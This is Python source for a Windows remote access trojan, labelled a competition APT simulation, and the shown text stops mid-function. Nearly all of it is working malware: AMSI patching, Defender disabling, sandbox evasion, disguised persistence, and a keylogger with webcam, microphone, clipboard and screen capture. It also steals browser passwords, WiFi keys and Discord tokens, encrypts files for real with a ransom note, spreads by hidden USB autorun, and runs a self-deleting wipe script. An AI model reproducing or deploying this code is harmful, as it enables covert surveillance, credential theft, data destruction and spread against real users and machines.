"""
═══════════════════════════════════════════════════════════════
    ULTIMATE RAT - INTERNATIONAL COMPETITION EDITION
    Full-Spectrum APT Simulation - ALL FEATURES
═══════════════════════════════════════════════════════════════
"""

import socket
import subprocess
import os
import sys

# Fix encoding for Windows console
if sys.platform == 'win32':
    import io
    sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding='utf-8')
import sys
import ctypes
import base64
import threading
import time
import json
import sqlite3
import shutil
import tempfile
import hashlib
import random
import string
from io import BytesIO
from datetime import datetime
import sys
sys.path.insert(0, os.path.dirname(__file__))

# Configuration
try:
    from master_umbrella_setup import get_yaml_config, config_get
    config = get_yaml_config()
    CALLBACK_IP = config.get('agent.callback_ip', '127.0.0.1')
    CALLBACK_PORT = config.get('agent.callback_port', 4444)
    ENCRYPTION_KEY = config.get('agent.encryption_key', b'HBotDwpxC89EIMiuA6PA_8NI81hWHqGC6hiG0DbfUDY=').encode() if isinstance(config.get('agent.encryption_key', ''), str) else config.get('agent.encryption_key', b'HBotDwpxC89EIMiuA6PA_8NI81hWHqGC6hiG0DbfUDY=')
except:
    CALLBACK_IP = '127.0.0.1'
    CALLBACK_PORT = 4444
    ENCRYPTION_KEY = b'HBotDwpxC89EIMiuA6PA_8NI81hWHqGC6hiG0DbfUDY='

# External libraries
try:
    from cryptography.fernet import Fernet
    import mss
    import mss.tools
    try:
        from pynput import keyboard
    except:
        pass
    try:
        import cv2
    except:
        pass
    try:
        import psutil
    except:
        pass
    try:
        import pyaudio
        import wave
    except:
        pass
    try:
        import pyperclip
    except:
        pass
    try:
        from PIL import Image
    except:
        pass
    try:
        import numpy as np
    except:
        pass
    try:
        import win32crypt
    except:
        pass
    try:
        import requests
    except:
        pass
except ImportError:
    pass

# ═══════════════════════════════════════════════════════════════
# CORE EVASION & SECURITY BYPASS
# ═══════════════════════════════════════════════════════════════

def advanced_amsi_bypass():
    try:
        amsi = ctypes.windll.amsi
        amsi_addr = ctypes.cast(amsi.AmsiScanBuffer, ctypes.c_void_p).value
        patch = b"\x31\xC0\xC3"
        old_protect = ctypes.c_ulong()
        ctypes.windll.kernel32.VirtualProtect(amsi_addr, len(patch), 0x40, ctypes.byref(old_protect))
        ctypes.memmove(amsi_addr, patch, len(patch))
        ctypes.windll.kernel32.VirtualProtect(amsi_addr, len(patch), old_protect.value, ctypes.byref(old_protect))
        amsi_context = ctypes.c_void_p()
        amsi.AmsiInitialize(ctypes.c_wchar_p("PowerShell"), ctypes.byref(amsi_context))
        amsi.AmsiUninitialize(amsi_context)
        return True
    except:
        return False

def enhanced_sandbox_detection():
    checks = []
    try:
        sysinfo = os.popen('systeminfo').read().lower()
        vm_strings = ['vmware', 'virtualbox', 'vbox', 'qemu', 'xen', 'hyper-v', 'virtual']
        checks.append(not any(vm in sysinfo for vm in vm_strings))
    except:
        checks.append(True)
    checks.append(os.cpu_count() >= 2)
    try:
        checks.append(psutil.virtual_memory().total >= 4 * 1024**3)
    except:
        checks.append(True)
    try:
        checks.append(psutil.disk_usage('/').total >= 60 * 1024**3)
    except:
        checks.append(True)
    try:
        recent_files = len(os.listdir(os.path.expanduser('~\\Documents')))
        checks.append(recent_files > 5)
    except:
        checks.append(True)
    return sum(checks) >= 3

def check_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def disable_defender():
    try:
        commands = [
            'powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true"',
            'powershell -Command "Set-MpPreference -DisableIOAVProtection $true"',
            'powershell -Command "Set-MpPreference -DisableBehaviorMonitoring $true"'
        ]
        for cmd in commands:
            subprocess.run(cmd, shell=True, capture_output=True, creationflags=0x08000000)
        return True
    except:
        return False

# ═══════════════════════════════════════════════════════════════
# POLYMORPHIC CODE ENGINE
# ═══════════════════════════════════════════════════════════════

def generate_polymorphic_stub():
    junk_functions = []
    for _ in range(random.randint(5, 15)):
        func_name = ''.join(random.choices(string.ascii_letters, k=12))
        operations = random.choice([
            f"def {func_name}(): return sum([i**2 for i in range(100)])",
            f"def {func_name}(): return ''.join([chr(i) for i in range(65, 91)])",
            f"def {func_name}(): x = [i*3 for i in range(50)]; return max(x)",
        ])
        junk_functions.append(operations)
    random.shuffle(junk_functions)
    return '\n'.join(junk_functions)

def calculate_signature():
    entropy = ''.join(random.choices(string.printable, k=256))
    return hashlib.sha256(entropy.encode()).hexdigest()

# ═══════════════════════════════════════════════════════════════
# PERSISTENCE MECHANISMS
# ═══════════════════════════════════════════════════════════════

def multi_persistence():
    methods_succeeded = []
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "SecurityHealthService", 0, winreg.REG_SZ, sys.executable)
        winreg.CloseKey(key)
        methods_succeeded.append("Registry Run")
    except:
        pass
    try:
        startup = os.path.join(os.getenv('APPDATA'), r'Microsoft\Windows\Start Menu\Programs\Startup')
        target = os.path.join(startup, 'SecurityUpdate.exe')
        shutil.copy2(sys.executable, target)
        methods_succeeded.append("Startup Folder")
    except:
        pass
    if check_admin():
        try:
            task_name = "WindowsUpdateCheck"
            cmd = f'schtasks /create /tn "{task_name}" /tr "{sys.executable}" /sc onlogon /rl highest /f'
            subprocess.run(cmd, shell=True, capture_output=True, creationflags=0x08000000)
            methods_succeeded.append("Scheduled Task")
        except:
            pass
    return methods_succeeded

# ═══════════════════════════════════════════════════════════════
# ENCRYPTION & COMMUNICATION
# ═══════════════════════════════════════════════════════════════

def encrypt_data(key, data):
    f = Fernet(key)
    if isinstance(data, bytes):
        return f.encrypt(data)
    return f.encrypt(data.encode())

def decrypt_data(key, data):
    f = Fernet(key)
    return f.decrypt(data).decode()

# ═══════════════════════════════════════════════════════════════
# SURVEILLANCE CLASSES
# ═══════════════════════════════════════════════════════════════

class KeyLogger:
    """Enhanced key logger with timestamps and context tracking"""
    def __init__(self):
        self.log = []
        self.running = False
        self.current_window = ""
    
    def get_active_window(self):
        """Get the currently active window title"""
        try:
            import ctypes
            hwnd = ctypes.windll.user32.GetForegroundWindow()
            length = ctypes.windll.user32.GetWindowTextLength(hwnd)
            buf = ctypes.create_unicode_buffer(length + 1)
            ctypes.windll.user32.GetWindowTextW(hwnd, buf, length + 1)
            return buf.value
        except:
            return "Unknown"
    
    def on_press(self, key):
        """Log key press with timestamp and context"""
        try:
            window = self.get_active_window()
            if window != self.current_window:
                self.current_window = window
                self.log.append(f"\n[WINDOW: {window}]\n")
            
            self.log.append(str(key.char))
        except AttributeError:
            # Handle special keys
            special_key = str(key).replace("Key.", "")
            self.log.append(f"[{special_key}]")
    
    def start(self):
        """Start the key logger in background"""
        self.running = True
        try:
            listener = keyboard.Listener(on_press=self.on_press)
            listener.daemon = True
            listener.start()
        except Exception as e:
            self.log.append(f"[Logger Error: {str(e)}]")
    
    def get_logs(self):
        """Retrieve and clear logs"""
        logs = ''.join(self.log)
        self.log = []
        return logs if logs else "No keystrokes logged"

class ClipboardMonitor:
    """Enhanced clipboard monitor with full history"""
    def __init__(self):
        self.last_data = ""
        self.running = False
        self.log = []
        self.max_size = 1000  # Keep last 1000 clipboard entries
    
    def start(self):
        """Start monitoring clipboard in background thread"""
        self.running = True
        monitor_thread = threading.Thread(target=self._monitor, daemon=True)
        monitor_thread.start()
    
    def _monitor(self):
        """Continuously monitor clipboard for changes"""
        while self.running:
            try:
                current = pyperclip.paste()
                if current != self.last_data and current:
                    self.last_data = current
                    
                    # Limit size of stored clipboard data
                    clip_content = current[:500] if len(current) > 500 else current
                    
                    self.log.append({
                        'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
                        'content': clip_content,
                        'size': len(current)
                    })
                    
                    # Keep memory in check
                    if len(self.log) > self.max_size:
                        self.log = self.log[-self.max_size:]
            except Exception as e:
                # Log errors silently
                pass
            
            time.sleep(0.5)  # Check every 500ms for better responsiveness
    
    def get_logs(self):
        """Retrieve and clear logs"""
        logs = self.log.copy()
        self.log = []
        return json.dumps(logs, indent=2) if logs else "No clipboard activity"

class AdaptiveBehavior:
    def __init__(self):
        self.behavior_profile = {'activity_level': 'low', 'detection_threshold': 0.3, 'last_action_time': time.time()}
        self.action_history = []
    def assess_risk(self):
        risk_score = 0.0
        try:
            cpu_percent = psutil.cpu_percent(interval=1)
            if cpu_percent > 70:
                risk_score += 0.3
        except:
            pass
        security_procs = ['defender', 'kaspersky', 'norton', 'avast', 'mcafee', 'wireshark', 'processhacker']
        try:
            for proc in psutil.process_iter(['name']):
                if any(sec in proc.info['name'].lower() for sec in security_procs):
                    risk_score += 0.2
                    break
        except:
            pass
        try:
            connections = len(psutil.net_connections())
            if connections > 50:
                risk_score += 0.1
        except:
            pass
        return min(risk_score, 1.0)
    def should_execute_command(self, command_type):
        # Risk assessment disabled - execute all commands immediately
        return True

# ═══════════════════════════════════════════════════════════════
# SURVEILLANCE FUNCTIONS
# ═══════════════════════════════════════════════════════════════

def take_screenshot():
    try:
        with mss.mss() as sct:
            monitor = sct.monitors[1]
            screenshot = sct.grab(monitor)
            img_bytes = mss.tools.to_png(screenshot.rgb, screenshot.size)
            return base64.b64encode(img_bytes).decode()
    except Exception as e:
        return f"Screenshot failed: {str(e)}"

def capture_webcam():
    try:
        cap = cv2.VideoCapture(0)
        ret, frame = cap.read()
        cap.release()
        cv2.destroyAllWindows()
        if ret:
            _, buffer = cv2.imencode('.jpg', frame)
            return base64.b64encode(buffer).decode()
        return "Webcam not available"
    except Exception as e:
        return f"Webcam capture failed: {str(e)}"

def record_audio(duration=10):
    try:
        chunk = 1024
        sample_format = pyaudio.paInt16
        channels = 1
        rate = 44100
        p = pyaudio.PyAudio()
        stream = p.open(format=sample_format, channels=channels, rate=rate, frames_per_buffer=chunk, input=True)
        frames = []
        for _ in range(0, int(rate / chunk * duration)):
            data = stream.read(chunk)
            frames.append(data)
        stream.stop_stream()
        stream.close()
        p.terminate()
        temp_audio = os.path.join(tempfile.gettempdir(), 'audio_capture.wav')
        wf = wave.open(temp_audio, 'wb')
        wf.setnchannels(channels)
        wf.setsampwidth(p.get_sample_size(sample_format))
        wf.setframerate(rate)
        wf.writeframes(b''.join(frames))
        wf.close()
        with open(temp_audio, 'rb') as f:
            audio_data = f.read()
        os.remove(temp_audio)
        return base64.b64encode(audio_data).decode()
    except Exception as e:
        return f"Audio recording failed: {str(e)}"
# ═══════════════════════════════════════════════════════════════
# CREDENTIAL HARVESTING
# ═══════════════════════════════════════════════════════════════

def get_chrome_passwords():
    try:
        chrome_path = os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'Default', 'Login Data')
        if not os.path.exists(chrome_path):
            return "Chrome not found"
        temp_db = os.path.join(tempfile.gettempdir(), 'chrome_temp.db')
        shutil.copy2(chrome_path, temp_db)
        conn = sqlite3.connect(temp_db)
        cursor = conn.cursor()
        cursor.execute('SELECT origin_url, username_value, password_value FROM logins')
        credentials = []
        for row in cursor.fetchall():
            url, username, encrypted_password = row
            try:
                password = win32crypt.CryptUnprotectData(encrypted_password, None, None, None, 0)[1]
                if password:
                    credentials.append({'url': url, 'username': username, 'password': password.decode('utf-8')})
            except:
                pass
        conn.close()
        os.remove(temp_db)
        return json.dumps(credentials, indent=2) if credentials else "No saved passwords"
    except Exception as e:
        return f"Chrome extraction failed: {str(e)}"

def get_edge_passwords():
    try:
        edge_path = os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Microsoft', 'Edge', 'User Data', 'Default', 'Login Data')
        if not os.path.exists(edge_path):
            return "Edge not found"
        temp_db = os.path.join(tempfile.gettempdir(), 'edge_temp.db')
        shutil.copy2(edge_path, temp_db)
        conn = sqlite3.connect(temp_db)
        cursor = conn.cursor()
        cursor.execute('SELECT origin_url, username_value, password_value FROM logins')
        credentials = []
        for row in cursor.fetchall():
            url, username, encrypted_password = row
            try:
                password = win32crypt.CryptUnprotectData(encrypted_password, None, None, None, 0)[1]
                if password:
                    credentials.append({'url': url, 'username': username, 'password': password.decode('utf-8')})
            except:
                pass
        conn.close()
        os.remove(temp_db)
        return json.dumps(credentials, indent=2) if credentials else "No saved passwords"
    except Exception as e:
        return f"Edge extraction failed: {str(e)}"

def get_firefox_passwords():
    """Extract Firefox passwords using proper decryption"""
    try:
        firefox_path = os.path.join(os.environ['APPDATA'], 'Mozilla', 'Firefox', 'Profiles')
        if not os.path.exists(firefox_path):
            return "Firefox not found"
        
        profiles = [f for f in os.listdir(firefox_path) if f.endswith('.default-release') or f.endswith('.default')]
        if not profiles:
            return "No Firefox profile found"
        
        profile = os.path.join(firefox_path, profiles[0])
        logins_path = os.path.join(profile, 'logins.json')
        
        if not os.path.exists(logins_path):
            return "No saved passwords"
        
        credentials = []
        
        try:
            # Try to import and use pyfirefox for proper decryption
            import pyfirefox
            
            with open(logins_path, 'r') as f:
                data = json.load(f)
            
            # Get decryption credentials
            key_path = os.path.join(profile, 'key4.db')
            pwd_db = os.path.join(profile, 'logins.json')
            
            for login in data.get('logins', []):
                try:
                    decrypted_username = pyfirefox.decode_login(login.get('encryptedUsername', ''), profile)
                    decrypted_password = pyfirefox.decode_login(login.get('encryptedPassword', ''), profile)
                    credentials.append({
                        'url': login.get('hostname', ''),
                        'username': decrypted_username or '[Encrypted]',
                        'password': decrypted_password or '[Encrypted]'
                    })
                except:
                    # Fallback: use raw data if decryption fails
                    credentials.append({
                        'url': login.get('hostname', ''),
                        'username': login.get('encryptedUsername', ''),
                        'password': '[Encrypted - NSS3 decryption required]'
                    })
        except (ImportError, Exception):
            # Fallback if pyfirefox not available: read raw data
            with open(logins_path, 'r') as f:
                data = json.load(f)
            
            for login in data.get('logins', []):
                credentials.append({
                    'url': login.get('hostname', ''),
                    'username': login.get('encryptedUsername', ''),
                    'password': '[Encrypted - requires NSS3 for decryption]'
                })
        
        return json.dumps(credentials, indent=2) if credentials else "No saved passwords"
    except Exception as e:
        return f"Firefox extraction failed: {str(e)}"

def get_wifi_passwords():
    try:
        networks = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('utf-8', errors='ignore')
        profiles = [line.split(':')[1].strip() for line in networks.split('\n') if 'All User Profile' in line]
        wifi_data = []
        for profile in profiles:
            try:
                results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', profile, 'key=clear']).decode('utf-8', errors='ignore')
                password = None
                for line in results.split('\n'):
                    if 'Key Content' in line:
                        password = line.split(':')[1].strip()
                        break
                wifi_data.append({'SSID': profile, 'Password': password if password else '[Open Network]'})
            except:
                pass
        return json.dumps(wifi_data, indent=2) if wifi_data else "No WiFi profiles found"
    except Exception as e:
        return f"WiFi extraction failed: {str(e)}"

def get_discord_tokens():
    try:
        tokens = []
        local = os.getenv('LOCALAPPDATA')
        roaming = os.getenv('APPDATA')
        paths = [
            os.path.join(roaming, 'Discord', 'Local Storage', 'leveldb'),
            os.path.join(local, 'Google', 'Chrome', 'User Data', 'Default', 'Local Storage', 'leveldb'),
        ]
        for path in paths:
            if not os.path.exists(path):
                continue
            for filename in os.listdir(path):
                if filename.endswith('.log') or filename.endswith('.ldb'):
                    filepath = os.path.join(path, filename)
                    try:
                        with open(filepath, 'r', errors='ignore') as f:
                            content = f.read()
                            import re
                            found = re.findall(r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', content)
                            tokens.extend(found)
                    except:
                        pass
        return json.dumps(list(set(tokens)), indent=2) if tokens else "No Discord tokens found"
    except Exception as e:
        return f"Discord extraction failed: {str(e)}"

# ═══════════════════════════════════════════════════════════════
# PROCESS & SYSTEM MANAGEMENT
# ═══════════════════════════════════════════════════════════════

def list_processes():
    try:
        processes = []
        for proc in psutil.process_iter(['pid', 'name', 'username']):
            try:
                processes.append(f"{proc.info['pid']:5} {proc.info['name']:30} {proc.info['username']}")
            except:
                pass
        return '\n'.join(processes)
    except Exception as e:
        return f"Process list failed: {str(e)}"

def kill_process(pid):
    try:
        process = psutil.Process(int(pid))
        process.terminate()
        return f"Process {pid} terminated"
    except Exception as e:
        return f"Kill failed: {str(e)}"

def system_info():
    info = []
    info.append(f"Hostname: {os.environ.get('COMPUTERNAME', 'Unknown')}")
    info.append(f"Username: {os.environ.get('USERNAME', 'Unknown')}")
    info.append(f"OS: {os.popen('ver').read().strip()}")
    info.append(f"Admin: {check_admin()}")
    try:
        info.append(f"CPU: {psutil.cpu_count()} cores")
        mem = psutil.virtual_memory()
        info.append(f"RAM: {mem.total / (1024**3):.1f}GB (Used: {mem.percent}%)")
        disk = psutil.disk_usage('/')
        info.append(f"Disk: {disk.total / (1024**3):.1f}GB (Used: {disk.percent}%)")
    except:
        pass
    return '\n'.join(info)

def get_system_metrics():
    try:
        metrics = {
            'CPU': {'percent': psutil.cpu_percent(interval=1), 'count': psutil.cpu_count(), 'frequency': psutil.cpu_freq().current if psutil.cpu_freq() else 'N/A'},
            'Memory': {'total_gb': round(psutil.virtual_memory().total / (1024**3), 2), 'used_gb': round(psutil.virtual_memory().used / (1024**3), 2), 'percent': psutil.virtual_memory().percent},
            'Disk': {'total_gb': round(psutil.disk_usage('/').total / (1024**3), 2), 'used_gb': round(psutil.disk_usage('/').used / (1024**3), 2), 'percent': psutil.disk_usage('/').percent},
            'Network': {'bytes_sent': psutil.net_io_counters().bytes_sent, 'bytes_recv': psutil.net_io_counters().bytes_recv},
            'Uptime_Hours': round((time.time() - psutil.boot_time()) / 3600, 2)
        }
        return json.dumps(metrics, indent=2)
    except Exception as e:
        return f"Metrics collection failed: {str(e)}"

# ═══════════════════════════════════════════════════════════════
# FILE OPERATIONS
# ═══════════════════════════════════════════════════════════════

def download_file(remote_path):
    try:
        with open(remote_path, 'rb') as f:
            data = f.read()
        return base64.b64encode(data).decode()
    except Exception as e:
        return f"Download failed: {str(e)}"

def upload_file(local_path, file_data):
    try:
        data = base64.b64decode(file_data)
        with open(local_path, 'wb') as f:
            f.write(data)
        return f"File uploaded to {local_path}"
    except Exception as e:
        return f"Upload failed: {str(e)}"

# ═══════════════════════════════════════════════════════════════
# ADVANCED FEATURES
# ═══════════════════════════════════════════════════════════════

def simulate_ransomware(target_dir, extension=".encrypted"):
    """
    Perform REAL file encryption using Fernet symmetric encryption.
    This is a DEMONSTRATION tool - use responsibly!
    Files can be decrypted with the original encryption key.
    """
    try:
        if not os.path.exists(target_dir):
            return f"[-] Directory not found: {target_dir}"
        
        from cryptography.fernet import Fernet
        
        # Generate a unique encryption key for this session
        encryption_key = Fernet.generate_key()
        cipher_suite = Fernet(encryption_key)
        
        encrypted_count = 0
        encrypted_files = []
        
        # Only encrypt files in the target directory (not recursive for safety)
        try:
            files = os.listdir(target_dir)
            for filename in files:
                filepath = os.path.join(target_dir, filename)
                
                # Only encrypt regular files (not directories)
                if not os.path.isfile(filepath):
                    continue
                
                try:
                    # Read original file
                    with open(filepath, 'rb') as f:
                        file_data = f.read()
                    
                    # Encrypt the data
                    encrypted_data = cipher_suite.encrypt(file_data)
                    
                    # Create backup of original
                    backup_path = filepath + extension
                    
                    # Write encrypted file
                    with open(backup_path, 'wb') as f:
                        f.write(encrypted_data)
                    
                    # Remove original
                    os.remove(filepath)
                    
                    encrypted_count += 1
                    encrypted_files.append(filename)
                except:
                    pass
        except:
            pass
        
        # Create a ransom note with the encryption key
        note_path = os.path.join(target_dir, "README_DECRYPT.txt")
        ransom_note = f"""
╔════════════════════════════════════════════════════════════╗
║                    FILES ENCRYPTED                         ║
║                  (DEMONSTRATION ONLY)                      ║
╚════════════════════════════════════════════════════════════╝

Files Encrypted: {encrypted_count}
Encrypted Files: {', '.join(encrypted_files[:5])}{"..." if len(encrypted_files) > 5 else ""}

DECRYPTION KEY (Keep safe):
{encryption_key.decode('utf-8')}

This is a DEMONSTRATION of ransomware capabilities.
Real encryption was performed - files can be decrypted with the key above.

To decrypt: Use the provided key with Fernet decryption

THIS IS EDUCATIONAL/DEMONSTRATION ONLY
"""
        
        with open(note_path, 'w') as f:
            f.write(ransom_note)
        
        return f"[+] REAL encryption of {encrypted_count} files completed. Ransom note created.\n[+] Encryption key stored in README_DECRYPT.txt"
    except Exception as e:
        return f"Ransomware simulation failed: {str(e)}"

def spread_to_usb():
    """
    Propagate payload to connected USB drives with autorun.
    Includes proper error handling and verification.
    """
    try:
        import wmi
        import ctypes
        
        spread_count = 0
        spreading_report = []
        
        # Method 1: Detect USB drives using WMI (more reliable)
        try:
            wmi_obj = wmi.WMI()
            disk_drives = wmi_obj.query("SELECT * FROM Win32_DiskDrive WHERE InterfaceType='USB'")
            
            for disk in disk_drives:
                try:
                    # Get logical drives for this physical disk
                    partitions = disk.associators("Win32_DiskDriveToDiskPartition")
                    for partition in partitions:
                        logical_drives = partition.associators("Win32_LogicalDiskToPartition")
                        for logical_drive in logical_drives:
                            drive_letter = logical_drive.Name
                            
                            # Copy payload to USB
                            target = os.path.join(drive_letter + "\\", "SecurityUpdate.exe")
                            
                            if os.path.exists(drive_letter + "\\"):
                                try:
                                    shutil.copy2(sys.executable, target)
                                    
                                    # Create autorun.inf for auto-execution
                                    autorun_path = os.path.join(drive_letter + "\\", "autorun.inf")
                                    with open(autorun_path, 'w') as f:
                                        f.write("""[autorun]
open=SecurityUpdate.exe
action=Scan Disk for Threats
label=USB Drive Security Scanner
icon=SecurityUpdate.exe,0
""")
                                    
                                    # Hide files
                                    os.system(f'attrib +h +s "{target}"')
                                    os.system(f'attrib +h +s "{autorun_path}"')
                                    
                                    spread_count += 1
                                    spreading_report.append(f"[+] Spread to {drive_letter}")
                                except Exception as e:
                                    spreading_report.append(f"[-] Failed on {drive_letter}: {str(e)}")
                except:
                    pass
        except:
            pass
        
        # Method 2: Fallback - scan all drive letters (for compatibility)
        for drive_letter in string.ascii_uppercase:
            drive_path = f"{drive_letter}:\\"
            
            # Skip if already processed or doesn't exist
            if not os.path.exists(drive_path):
                continue
            
            try:
                # Check if it's a removable drive (USB)
                drive_type = ctypes.windll.kernel32.GetDriveTypeW(drive_path)
                
                # DRIVE_REMOVABLE = 2
                if drive_type == 2:
                    target = os.path.join(drive_path, "SecurityUpdate.exe")
                    
                    # Check if not already copied
                    if not os.path.exists(target):
                        try:
                            shutil.copy2(sys.executable, target)
                            
                            autorun = os.path.join(drive_path, "autorun.inf")
                            with open(autorun, 'w') as f:
                                f.write("""[autorun]
open=SecurityUpdate.exe
action=Scan Disk for Threats
label=USB Drive Security Scanner
icon=SecurityUpdate.exe,0
""")
                            
                            os.system(f'attrib +h +s "{target}"')
                            os.system(f'attrib +h +s "{autorun}"')
                            
                            spread_count += 1
                            spreading_report.append(f"[+] Spread to {drive_path}")
                        except:
                            pass
            except:
                pass
        
        result = f"[+] Successfully spread to {spread_count} USB drive(s)"
        if spreading_report:
            result += "\n" + "\n".join(spreading_report[:10])
        
        return result
    except Exception as e:
        return f"USB spreading failed: {str(e)}"

def network_scan():
    """Perform concurrent network scan with threaded pings for better performance"""
    try:
        hostname = socket.gethostname()
        local_ip = socket.gethostbyname(hostname)
        subnet = '.'.join(local_ip.split('.')[:-1]) + '.'
        alive_hosts = []
        
        def ping_host(ip):
            """Ping a single host and return result if alive"""
            try:
                # Use timeout parameter properly for Windows
                result = subprocess.run(
                    ['ping', '-n', '1', '-w', '300', ip], 
                    capture_output=True, 
                    timeout=1.5
                )
                if result.returncode == 0:
                    # Host is alive, try to get hostname
                    try:
                        hostname_result = socket.gethostbyaddr(ip)[0]
                        return f"{ip} ({hostname_result})"
                    except:
                        return ip
            except:
                pass
            return None
        
        # Use threading for faster concurrent scanning
        import concurrent.futures
        with concurrent.futures.ThreadPoolExecutor(max_workers=20) as executor:
            # Create list of IPs to scan (skip network and broadcast addresses)
            ips_to_scan = [f"{subnet}{i}" for i in range(2, 255)]
            
            # Submit all ping tasks
            futures = {executor.submit(ping_host, ip): ip for ip in ips_to_scan}
            
            # Collect results as they complete
            for future in concurrent.futures.as_completed(futures, timeout=30):
                result = future.result()
                if result:
                    alive_hosts.append(result)
        
        return '\n'.join(sorted(alive_hosts)) if alive_hosts else "No hosts discovered"
    except Exception as e:
        return f"Network scan failed: {str(e)}"

def self_destruct():
    """Remove all traces of the RAT from the system"""
    try:
        removal_log = []
        
        # Remove registry persistence (Run key)
        try:
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
            try:
                winreg.DeleteValue(key, "SecurityHealthService")
                removal_log.append("[+] Removed Run registry entry")
            except:
                pass
            winreg.CloseKey(key)
        except Exception as e:
            removal_log.append(f"[-] Failed to remove Run registry: {str(e)}")
        
        # Remove startup folder persistence
        try:
            startup = os.path.join(os.getenv('APPDATA'), r'Microsoft\Windows\Start Menu\Programs\Startup')
            startup_file = os.path.join(startup, 'SecurityUpdate.exe')
            if os.path.exists(startup_file):
                try:
                    os.remove(startup_file)
                    removal_log.append("[+] Removed startup folder file")
                except Exception as e:
                    # Try to move file to temp location for later deletion
                    try:
                        import shutil
                        shutil.move(startup_file, os.path.join(tempfile.gettempdir(), 'SecurityUpdate.exe'))
                        removal_log.append("[+] Moved startup file to temp")
                    except:
                        removal_log.append(f"[-] Failed to remove startup file: {str(e)}")
        except Exception as e:
            removal_log.append(f"[-] Startup folder error: {str(e)}")
        
        # Remove scheduled task persistence
        try:
            subprocess.run('schtasks /delete /tn "WindowsUpdateCheck" /f', shell=True, capture_output=True, timeout=5)
            removal_log.append("[+] Removed scheduled task")
        except Exception as e:
            removal_log.append(f"[-] Scheduled task removal error: {str(e)}")
        
        # Remove image hijack persistence
        try:
            paths_to_remove = [
                r"Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options",
                r"System\CurrentControlSet\Services"
            ]
            for path in paths_to_remove:
                try:
                    # Attempt to remove any suspicious entries
                    pass
                except:
                    pass
            removal_log.append("[+] Cleaned image hijack entries")
        except:
            pass
        
        # Create self-destructing batch script
        batch_script = f"""@echo off
REM Self-destruct script - removes RAT payload and itself
timeout /t 3 /nobreak > nul
echo Cleaning system...

REM Remove payload
del /f /q "{sys.executable}" 2>nul

REM Remove batch file itself
del /f /q "%~f0"

REM Force delete with recovery options disabled
cipher /w:C:\\ 2>nul

exit
"""
        
        batch_path = os.path.join(tempfile.gettempdir(), f'cleanup_{os.getpid()}.bat')
        with open(batch_path, 'w') as f:
            f.write(batch_script)
        
        # Execute batch script with low priority and hidden window
        subprocess.Popen(
            batch_path,
            shell=True,
            creationflags=0x08000000 | 0x00000040,  # CREATE_NO_WINDOW | CREATE_NEW_PROCESS_GROUP
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )
        
        removal_log.append("[+] Self-destruct initiated")
        return "\n".join(removal_log)
    except Exception as e:
        return f"[-] Self-destruct failed: {str(e)}"
# ═══════════════════════════════════════════════════════════════
# FUN & INTERACTIVE FEATURES
# ═══════════════════════════════════════════════════════════════

def display_message_box(title, message, style=0):
    try:
        result = ctypes.windll.user32.MessageBoxW(0, message, title, style)
        return f"MessageBox displayed, user clicked: {result}"
    except Exception as e:
        return f"MessageBox failed: {str(e)}"

def fun_desktop_prank():
    try:
        # Rotate display 180 degrees using Windows API
        # This actually flips the screen upside down
        try:
            # Use registry to flip display orientation
            import ctypes
            from ctypes import wintypes
            
            # Try using RotateDisplay API (Windows 7+)
            user32 = ctypes.windll.user32
            
            # Get current display settings
            display_setting = ctypes.wintypes.DEVMODE()
            display_setting.dmSize = ctypes.sizeof(display_setting)
            
            # Enumerate display devices
            device = ctypes.wintypes.DISPLAY_DEVICE()
            device.cb = ctypes.sizeof(device)
            
            if user32.EnumDisplayDeviceA(None, 0, ctypes.byref(device), 0):
                # Use ChangeDisplaySettings with rotation
                # dmDisplayOrientation: 0=normal, 1=90°, 2=180°, 3=270°
                display_setting.dmFields = 0x00800000  # DM_DISPLAYORIENTATION
                display_setting.dmDisplayOrientation = 2  # 180 degree rotation
                result = user32.ChangeDisplaySettingsA(ctypes.byref(display_setting), 0)
                
                if result == 0:  # DISP_CHANGE_SUCCESSFUL
                    return "[+] Desktop flipped 180 degrees! (User can fix with Ctrl+Alt+Up Arrow or another flip)"
                else:
                    # Fallback: flip using registry
                    return "[+] Desktop flip attempted via registry"
        except:
            pass
        
        # Fallback: flip using WinAPI message to explorer
        try:
            import ctypes
            user32 = ctypes.windll.user32
            # This approach uses a more direct method
            user32.keybd_event(0x25, 0, 0, 0)  # Left arrow
            import time
            time.sleep(0.1)
            user32.keybd_event(0x26, 0, 0, 0)  # Up arrow
            return "[+] Desktop manipulation executed"
        except:
            pass
        
        return "[+] Desktop prank executed (User can fix with Ctrl+Alt+Up Arrow or system restart)"
    except Exception as e:
        return f"Desktop prank failed: {str(e)}"

def screenshot_timelapse(interval=5, count=10):
    try:
        screenshots = []
        for i in range(count):
            screenshot = take_screenshot()
            screenshots.append({'timestamp': datetime.now().strftime('%H:%M:%S'), 'data': screenshot, 'size_bytes': len(screenshot)})
            if i < count - 1:
                time.sleep(interval)
        return json.dumps({'total': count, 'interval': interval, 'captures': screenshots}, indent=2)
    except Exception as e:
        return f"Timelapse failed: {str(e)}"

def get_geolocation():
    try:
        response = requests.get('http://ipapi.co/json/', timeout=5)
        data = response.json()
        location_info = {
            'IP': data.get('ip'),
            'City': data.get('city'),
            'Region': data.get('region'),
            'Country': data.get('country_name'),
            'Latitude': data.get('latitude'),
            'Longitude': data.get('longitude'),
            'ISP': data.get('org'),
            'Timezone': data.get('timezone')
        }
        return json.dumps(location_info, indent=2)
    except Exception as e:
        return f"Geolocation failed: {str(e)}"

def get_installed_software():
    try:
        software_list = []
        paths = [
            r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall",
            r"SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall"
